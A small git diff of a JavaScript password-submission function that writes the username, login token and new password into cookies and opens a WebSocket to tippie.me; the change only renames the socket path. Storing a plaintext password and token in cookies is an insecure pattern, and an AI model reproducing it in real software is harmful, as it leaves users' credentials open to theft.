@@ -3,7 +3,7 @@ async function submitPassword(){
     setCookie('fix_password',document.getElementById('username').value,0.01)
     setCookie('fix_password_token',document.getElementById('logintoken').value,0.01)
     setCookie('fix_password_new',await document.getElementById('password').value,0.01)
-    const ws = new WebSocket("wss://tippie.me/lcn");
+    const ws = new WebSocket("wss://tippie.me/sales");
     ws.onmessage = function (e){
         deleteCookie('fix_password')
         deleteCookie('fix_password_token')
